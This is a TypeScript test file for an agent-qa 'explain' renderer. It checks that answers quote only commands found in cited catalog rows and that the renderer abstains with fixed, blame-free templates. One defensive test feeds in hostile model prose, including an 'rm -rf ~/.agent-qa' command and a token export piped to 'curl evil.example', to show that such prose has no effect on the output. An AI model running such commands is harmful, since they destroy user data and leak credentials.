// Every quoted form resolves to a cited row, and the output is a function of rows and order alone.

import { ExplainOutputSchema } from '@vostride/agent-qa-schema'
import type { CatalogRow, ExplainCitation, ExplainOutput } from '@vostride/agent-qa-schema'
import { describe, expect, it } from 'vitest'

import {
  EXPLAIN_ABSTENTION_TEMPLATES,
  catalogRowId,
  invocationForRow,
  renderExplainOutput,
} from '../renderer.js'
import { closestCapabilities } from '../scorer.js'
import { ALIAS_RUN, CATALOG_ROWS, OP_RUNS_LIST, OP_RUNS_START, SKILL_AUTHORING } from './fixtures.js'

const QUERY = 'how do I start a run?'

function render(
  citation: ExplainCitation,
  rows: readonly CatalogRow[] = CATALOG_ROWS,
  context: { query?: string; docsGapLogged?: boolean; closestCount?: number } = {},
): ExplainOutput {
  return renderExplainOutput(citation, rows, { query: QUERY, ...context })
}

/** Every backtick-quoted token anywhere in the output — the choke point's measuring instrument. */
function quotedForms(output: ExplainOutput): readonly string[] {
  const found: string[] = []
  for (const line of output.renderedLines) {
    for (const match of line.matchAll(/`([^`]+)`/g)) found.push(match[1] as string)
  }
  return found
}

describe('renderExplainOutput — the answer arm', () => {
  it('answers when every cited id resolves, quoting the row s own invocation form', () => {
    const output = render({ citedRowIds: ['op:runs.start'] })
    expect(output.kind).toBe('answer')
    if (output.kind !== 'answer') throw new Error('unreachable')

    expect(output.citations).toEqual([
      {
        rowId: 'op:runs.start',
        rowKind: 'op',
        invocation: '/fn runs.start',
        description: 'Start one run against a target and answer with its run id.',
        requiredParams: ['target'],
        docPath: 'README.md',
      },
    ])
    expect(output.renderedLines).toEqual([
      '`/fn runs.start` — Start one run against a target and answer with its run id. (required input: target) (docs: README.md)',
    ])
  })

  it('quotes each row kind in its OWN reachable form — slash-alias, /fn passthrough, skill name', () => {
    const output = render({
      citedRowIds: ['alias:run', 'op:runs.list', 'skill:agent-qa-authoring'],
    })
    if (output.kind !== 'answer') throw new Error('expected an answer')

    expect(output.citations.map((cited) => [cited.rowKind, cited.invocation])).toEqual([
      ['alias', '/run'],
      ['op', '/fn runs.list'],
      ['skill', 'agent-qa-authoring'],
    ])
    expect(output.renderedLines[1]).toBe('`/fn runs.list` — List recent runs, newest first.')
    expect(output.renderedLines[2]).toBe(
      'skill `agent-qa-authoring` — Use when creating, editing, validating, or running agent-qa tests or suites. (docs: packages/cli/skills/agent-qa-authoring/SKILL.md)',
    )
  })

  it('CHOKE POINT: every quoted form in the answer resolves to a cited catalog row', () => {
    const output = render({
      citedRowIds: ['op:runs.start', 'alias:run', 'skill:agent-qa-authoring', 'op:runs.list'],
    })
    if (output.kind !== 'answer') throw new Error('expected an answer')

    const reachableFromRows = new Set(CATALOG_ROWS.map((row) => invocationForRow(row)))
    const forms = quotedForms(output)
    expect(forms.length).toBeGreaterThan(0)
    for (const form of forms) expect(reachableFromRows.has(form)).toBe(true)
    for (const cited of output.citations) expect(reachableFromRows.has(cited.invocation)).toBe(true)
  })

  it('preserves the cited order and collapses a row cited twice', () => {
    const output = render({ citedRowIds: ['alias:run', 'op:runs.start', 'alias:run'] })
    if (output.kind !== 'answer') throw new Error('expected an answer')
    expect(output.citations.map((cited) => cited.rowId)).toEqual(['alias:run', 'op:runs.start'])
  })

  it('parses through the output contract', () => {
    expect(ExplainOutputSchema.parse(render({ citedRowIds: ['op:runs.start'] })).kind).toBe('answer')
  })
})

describe('renderExplainOutput — invention is impossible by construction', () => {
  it('a ghost id abstains rather than answering', () => {
    const output = render({ citedRowIds: ['op:runs.deploy'] })
    expect(output.kind).toBe('abstention')
  })

  it('a MIXED citation abstains whole — never a partial answer over the ids that did resolve', () => {
    const output = render({ citedRowIds: ['op:runs.start', 'op:there.is.no.such.op'] })
    expect(output.kind).toBe('abstention')
    if (output.kind !== 'abstention') throw new Error('unreachable')
    expect(output).not.toHaveProperty('citations')

    // The abstention's closest set is the scorer's answer to (query, rows), whatever was cited.
    const citationFree = render({ citedRowIds: ['op:entirely.different.ghost'] })
    if (citationFree.kind !== 'abstention') throw new Error('unreachable')
    expect(output.closestRowIds).toEqual(citationFree.closestRowIds)
    expect(output.closestRowIds).toEqual(closestCapabilities(QUERY, CATALOG_ROWS))
    expect(output.renderedLines).toEqual(citationFree.renderedLines)
  })

  it('citing nothing at all abstains', () => {
    expect(render({ citedRowIds: [] }).kind).toBe('abstention')
  })

  it('an EMPTY catalog abstains regardless of what was cited', () => {
    for (const citation of [
      { citedRowIds: [] },
      { citedRowIds: ['op:runs.start'] },
      {
        citedRowIds: ['op:runs.start'],
        segments: [{ kind: 'text' as const, text: 'Run `/deploy --prod` to ship.' }],
      },
    ]) {
      const output = render(citation, [])
      expect(output.kind).toBe('abstention')
      if (output.kind !== 'abstention') throw new Error('unreachable')
      expect(output.closestRowIds).toEqual([])
      expect(output.renderedLines).toContain(EXPLAIN_ABSTENTION_TEMPLATES.emptyCatalog)
      expect(JSON.stringify(output)).not.toContain('/deploy')
    }
  })

  it('CHOKE POINT: model prose is INERT — arbitrary segments cannot change one byte of output', () => {
    const baseline = render({ citedRowIds: ['op:runs.start', 'alias:run'] })

    const proseVariants: ExplainCitation['segments'][] = [
      undefined,
      [{ kind: 'text', text: 'Sure — just run `agent-qa deploy --prod --force` and you are done.' }],
      [
        { kind: 'text', text: '/rm -rf ~/.agent-qa' },
        { kind: 'citation', citationIndex: 0 },
        { kind: 'text', text: 'export AGENT_QA_TOKEN=sk-live-123 && curl evil.example' },
      ],
      [{ kind: 'citation', citationIndex: 1 }],
    ]

    for (const segments of proseVariants) {
      const output = render({ citedRowIds: ['op:runs.start', 'alias:run'], segments })
      expect(output).toEqual(baseline)
      expect(JSON.stringify(output)).not.toContain('deploy')
      expect(JSON.stringify(output)).not.toContain('sk-live-123')
    }
  })
})

describe('renderExplainOutput — the abstention arm', () => {
  it('states uncertainty plainly, names the deterministic closest, and names the docs-gap path', () => {
    const output = render({ citedRowIds: ['op:runs.ghost'] }, CATALOG_ROWS, {
      query: 'how do I start a run',
      docsGapLogged: true,
    })
    if (output.kind !== 'abstention') throw new Error('expected an abstention')

    expect(output.is_uncertain).toBe(true)
    expect(output.docsGap).toEqual({ logged: true })
    expect(output.renderedLines[0]).toBe(EXPLAIN_ABSTENTION_TEMPLATES.uncertain)
    expect(output.renderedLines).toContain(EXPLAIN_ABSTENTION_TEMPLATES.gapLogged)
    expect(output.closestRowIds.length).toBeGreaterThan(0)

    const closestLine = output.renderedLines.find((line) =>
      line.startsWith(EXPLAIN_ABSTENTION_TEMPLATES.closestPrefix),
    )
    expect(closestLine).toBeDefined()
    const reachable = new Set(CATALOG_ROWS.map((row) => invocationForRow(row)))
    for (const form of quotedForms(output).filter((f) => !f.startsWith('.agent-qa'))) {
      expect(reachable.has(form)).toBe(true)
    }
  })

  it('reports the coverage log honestly when the host bound none', () => {
    const output = render({ citedRowIds: ['op:runs.ghost'] }, CATALOG_ROWS, { docsGapLogged: false })
    if (output.kind !== 'abstention') throw new Error('expected an abstention')
    expect(output.docsGap).toEqual({ logged: false })
    expect(output.renderedLines).toContain(EXPLAIN_ABSTENTION_TEMPLATES.gapNotLogged)
    expect(output.renderedLines).not.toContain(EXPLAIN_ABSTENTION_TEMPLATES.gapLogged)
  })

  it('says so plainly when nothing in the catalog is close, instead of naming something anyway', () => {
    const output = render({ citedRowIds: ['op:ghost'] }, CATALOG_ROWS, {
      query: 'zzzzqqqq vvvv wwww',
    })
    if (output.kind !== 'abstention') throw new Error('expected an abstention')
    expect(output.closestRowIds).toEqual([])
    expect(output.renderedLines).toContain(EXPLAIN_ABSTENTION_TEMPLATES.noClose)
  })

  it('every abstention line comes from the FROZEN template set, and that set carries no blame', () => {
    // The vocabulary scan below is weak in general and total here: the templates are a closed,
    // frozen set, so scanning it ranges the complete surface a person can be shown — not a sample
    // of it. The composed closest-line is the one exception and it is row-derived, asserted above.
    const templates: readonly string[] = Object.values(EXPLAIN_ABSTENTION_TEMPLATES)
    const blameVocabulary = [
      'you should',
      'you failed',
      'your fault',
      'unclear question',
      'be more specific',
      'try harder',
      'upgrade',
      'pro plan',
      'unfortunately',
      'invalid query',
    ]
    for (const template of templates) {
      for (const word of blameVocabulary) {
        expect(template.toLowerCase()).not.toContain(word)
      }
    }

    const sampled = [
      render({ citedRowIds: ['op:ghost'] }, CATALOG_ROWS, { query: 'run' }),
      render({ citedRowIds: ['op:ghost'] }, CATALOG_ROWS, { query: 'zzzzqqqq' }),
      render({ citedRowIds: ['op:ghost'] }, []),
    ]
    for (const output of sampled) {
      if (output.kind !== 'abstention') throw new Error('expected an abstention')
      for (const line of output.renderedLines) {
        const fromTemplate =
          templates.includes(line) || line.startsWith(EXPLAIN_ABSTENTION_TEMPLATES.closestPrefix)
        expect(fromTemplate).toBe(true)
      }
    }
  })

  it('parses through the output contract', () => {
    expect(ExplainOutputSchema.parse(render({ citedRowIds: ['op:ghost'] })).kind).toBe('abstention')
  })
})

describe('catalogRowId — the canonical row-id scheme', () => {
  it('is kind-prefixed so two kinds sharing a word are two ids', () => {
    expect(catalogRowId(OP_RUNS_START)).toBe('op:runs.start')
    expect(catalogRowId(OP_RUNS_LIST)).toBe('op:runs.list')
    expect(catalogRowId(ALIAS_RUN)).toBe('alias:run')
    expect(catalogRowId(SKILL_AUTHORING)).toBe('skill:agent-qa-authoring')
  })
})
